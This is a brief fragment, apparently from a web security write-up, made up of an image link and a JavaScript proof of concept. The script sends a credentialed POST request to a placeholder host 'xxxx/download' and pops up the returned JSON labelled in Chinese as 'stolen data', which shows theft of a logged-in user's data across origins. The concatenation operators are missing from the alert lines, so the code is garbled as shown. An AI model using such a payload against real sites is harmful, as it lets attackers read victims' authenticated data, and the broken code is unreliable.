![](../../images/6f69320f839a0b3317880908ff9f17c9.png)

```plain
(async () => {
  try {
    const res = await fetch("http://xxxx/download", {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: "{}"
    });
    if (!res.ok) {
      alert("请求失败，状态码："   res.status);
      return;
    }
    const data = await res.json();
    alert("窃取的数据:\n"   JSON.stringify(data, null, 2));
  } catch (error) {
    alert("请求异常："   error.message);
  }
})();
```

